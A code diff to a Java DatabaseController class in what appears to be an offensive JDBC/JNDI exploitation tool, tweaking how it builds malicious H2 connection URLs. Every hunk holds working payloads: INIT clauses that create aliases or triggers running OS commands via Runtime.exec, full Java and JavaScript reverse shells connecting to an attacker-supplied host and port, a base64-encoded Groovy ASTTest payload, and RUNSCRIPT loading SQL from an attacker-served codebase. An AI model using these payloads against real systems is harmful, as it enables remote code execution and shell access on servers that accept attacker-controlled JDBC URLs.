@@ -124,8 +124,8 @@ public abstract class DatabaseController implements Controller {
     public Properties h2JavaCommand(String cmd) {
         System.out.println("[H2] [Java] [Command] Cmd: " + cmd);
 
-        String url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;" +
-                "INIT=CREATE ALIAS EXEC AS 'void cmd_exec(String cmd) throws java.lang.Exception {Runtime.getRuntime().exec(System.getProperty(\"os.name\").toLowerCase().contains(\"win\") ? new String[]{\"cmd.exe\", \"/c\", \"COMMAND\"} : new String[]{\"sh\", \"-c\", \"COMMAND\"})\\;}'\\;".replace("COMMAND", cmd) +
+        String url = "jdbc:h2:mem:testdb;INIT=" +
+                "CREATE ALIAS IF NOT EXISTS EXEC AS 'void cmd_exec(String cmd) throws java.lang.Exception {Runtime.getRuntime().exec(System.getProperty(\"os.name\").toLowerCase().contains(\"win\") ? new String[]{\"cmd.exe\", \"/c\", cmd} : new String[]{\"sh\", \"-c\", cmd})\\;}'\\;" +
                 "CALL EXEC ('" + cmd + "')\\;";
 
         Properties props = new Properties();
@@ -139,8 +139,8 @@ public abstract class DatabaseController implements Controller {
     public Properties h2JavaReverseShell(String host, String port) {
         System.out.println("[H2] [Java] [ReverseShell] Host: " + host + " Port: " + port);
 
-        String url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;" +
-                "INIT=CREATE ALIAS REV_SHELL AS 'void rev_shell(String host, String port) throws java.lang.Exception {String shell=System.getProperty(\"os.name\").toLowerCase().contains(\"win\")?\"cmd\":\"sh\"\\;Process p=new ProcessBuilder(shell).redirectErrorStream(true).start()\\;java.net.Socket s=new java.net.Socket(host,Integer.valueOf(port))\\;java.io.InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream()\\;java.io.OutputStream po=p.getOutputStream(),so=s.getOutputStream()\\;while(!s.isClosed()){while(pi.available()>0){so.write(pi.read())\\;}while(pe.available()>0){so.write(pe.read())\\;}while(si.available()>0){po.write(si.read())\\;}so.flush()\\;po.flush()\\;Thread.sleep(50)\\;try{p.exitValue()\\;break\\;}catch(Exception e){}}p.destroy()\\;s.close()\\;}'\\;" +
+        String url = "jdbc:h2:mem:testdb;INIT=" +
+                "CREATE ALIAS IF NOT EXISTS REV_SHELL AS 'void rev_shell(String host, String port) throws java.lang.Exception {String shell=System.getProperty(\"os.name\").toLowerCase().contains(\"win\")?\"cmd\":\"sh\"\\;Process p=new ProcessBuilder(shell).redirectErrorStream(true).start()\\;java.net.Socket s=new java.net.Socket(host,Integer.valueOf(port))\\;java.io.InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream()\\;java.io.OutputStream po=p.getOutputStream(),so=s.getOutputStream()\\;while(!s.isClosed()){while(pi.available()>0){so.write(pi.read())\\;}while(pe.available()>0){so.write(pe.read())\\;}while(si.available()>0){po.write(si.read())\\;}so.flush()\\;po.flush()\\;Thread.sleep(50)\\;try{p.exitValue()\\;break\\;}catch(Exception e){}}p.destroy()\\;s.close()\\;}'\\;" +
                 "CALL REV_SHELL ('" + host + "', '" + port + "')\\;";
 
         Properties props = new Properties();
@@ -155,7 +155,8 @@ public abstract class DatabaseController implements Controller {
         System.out.println("[H2] [Groovy] [Command] Cmd: " + cmd);
 
         String groovy = "@groovy.transform.ASTTest(value={ assert java.lang.Runtime.getRuntime().exec(System.getProperty(\"os.name\").toLowerCase().contains(\"win\") ? new String[]{\"cmd.exe\", \"/c\", \"COMMAND\"} : new String[]{\"sh\", \"-c\", \"COMMAND\"}) }) def x".replace("COMMAND", cmd);
-        String url = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE ALIAS T5 AS '" + groovy + "'";
+        String db = MiscUtil.getRandStr(8);
+        String url = "jdbc:h2:mem:" + db + ";INIT=CREATE ALIAS T5 AS '" + groovy + "'";
 
         Properties props = new Properties();
         props.setProperty("driver", "org.h2.Driver");
@@ -170,7 +171,8 @@ public abstract class DatabaseController implements Controller {
 
         String payload = GroovyPayload.reverseShell(host, port);
         String groovy = "@groovy.transform.ASTTest(value={ assert new GroovyShell().evaluate(new String(java.util.Base64.getDecoder().decode(\"" + Base64.getEncoder().encodeToString(payload.getBytes())  + "\"))) }) def x";
-        String url = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE ALIAS T5 AS '" + groovy + "'";
+        String db = MiscUtil.getRandStr(8);
+        String url = "jdbc:h2:mem:" + db + ";INIT=CREATE ALIAS T5 AS '" + groovy + "'";
 
         Properties props = new Properties();
         props.setProperty("driver", "org.h2.Driver");
@@ -184,7 +186,8 @@ public abstract class DatabaseController implements Controller {
         System.out.println("[H2] [JavaScript] [Command] Cmd: " + cmd);
 
         String javascript = "//javascript\njava.lang.Runtime.getRuntime().exec(java.lang.System.getProperty(\"os.name\").toLowerCase().contains(\"win\") ? [\"cmd.exe\", \"/c\", \"COMMAND\"] : [\"sh\", \"-c\", \"COMMAND\"])".replace("COMMAND", cmd);
-        String url = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER test BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS '" + javascript + "'";
+        String db = MiscUtil.getRandStr(8);
+        String url = "jdbc:h2:mem:" + db + ";INIT=CREATE TRIGGER test BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS '" + javascript + "'";
 
         Properties props = new Properties();
         props.setProperty("driver", "org.h2.Driver");
@@ -198,7 +201,8 @@ public abstract class DatabaseController implements Controller {
         System.out.println("[H2] [JavaScript] [ReverseShell] Host: " + host + " Port: " + port);
 
         String javascript = "//javascript\nvar shell=java.lang.System.getProperty(\"os.name\").toLowerCase().contains(\"win\")?\"cmd\":\"sh\"\\;var p=new java.lang.ProcessBuilder(shell).redirectErrorStream(true).start()\\;var s=new java.net.Socket(\"" + host + "\"," + port + ")\\;var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream()\\;var po=p.getOutputStream(),so=s.getOutputStream()\\;while(!s.isClosed()){while(pi.available()>0){so.write(pi.read())\\;}while(pe.available()>0){so.write(pe.read())\\;}while(si.available()>0){po.write(si.read())\\;}so.flush()\\;po.flush()\\;java.lang.Thread.sleep(50)\\;try{p.exitValue()\\;break\\;}catch(e){}}p.destroy()\\;s.close()\\;";
-        String url = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER test BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS '" + javascript + "'";
+        String db = MiscUtil.getRandStr(8);
+        String url = "jdbc:h2:mem:" + db + ";INIT=CREATE TRIGGER test BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS '" + javascript + "'";
 
         Properties props = new Properties();
         props.setProperty("driver", "org.h2.Driver");
@@ -237,8 +241,8 @@ public abstract class DatabaseController implements Controller {
                 "CALL GET_SOUNDBANK(@obj);";
         WebServer.getInstance().serveFile("/" + sqlFileName, sqlContent.getBytes());
 
-        String url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;" +
-                "INIT=RUNSCRIPT FROM '" + Main.config.codebase + sqlFileName + "'";
+        String db = MiscUtil.getRandStr(8);
+        String url = "jdbc:h2:mem:" + db + ";INIT=RUNSCRIPT FROM '" + Main.config.codebase + sqlFileName + "'";
 
         Properties props = new Properties();
         props.setProperty("driver", "org.h2.Driver");
@@ -278,8 +282,8 @@ public abstract class DatabaseController implements Controller {
                 "CALL GET_SOUNDBANK(@obj);";
         WebServer.getInstance().serveFile("/" + sqlFileName, sqlContent.getBytes());
 
-        String url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;" +
-                "INIT=RUNSCRIPT FROM '" + Main.config.codebase + sqlFileName + "'";
+        String db = MiscUtil.getRandStr(8);
+        String url = "jdbc:h2:mem:" + db + ";INIT=RUNSCRIPT FROM '" + Main.config.codebase + sqlFileName + "'";
 
         Properties props = new Properties();
         props.setProperty("driver", "org.h2.Driver");
@@ -309,8 +313,8 @@ public abstract class DatabaseController implements Controller {
                 "CALL NEW_INSTANCE(@context_clazz, ARRAY[@string_clazz], ARRAY[@url_obj]);";
         WebServer.getInstance().serveFile("/" + sqlFileName, sqlContent.getBytes());
 
-        String url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;" +
-                "INIT=RUNSCRIPT FROM '" + Main.config.codebase + sqlFileName + "'";
+        String db = MiscUtil.getRandStr(8);
+        String url = "jdbc:h2:mem:" + db + ";INIT=RUNSCRIPT FROM '" + Main.config.codebase + sqlFileName + "'";
 
         Properties props = new Properties();
         props.setProperty("driver", "org.h2.Driver");
@@ -349,8 +353,8 @@ public abstract class DatabaseController implements Controller {
                 "CALL NEW_INSTANCE(@context_clazz, ARRAY[@string_clazz], ARRAY[@url_obj]);";
         WebServer.getInstance().serveFile("/" + sqlFileName, sqlContent.getBytes());
 
-        String url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;" +
-                "INIT=RUNSCRIPT FROM '" + Main.config.codebase + sqlFileName + "'";
+        String db = MiscUtil.getRandStr(8);
+        String url = "jdbc:h2:mem:" + db + ";INIT=RUNSCRIPT FROM '" + Main.config.codebase + sqlFileName + "'";
 
         Properties props = new Properties();
         props.setProperty("driver", "org.h2.Driver");
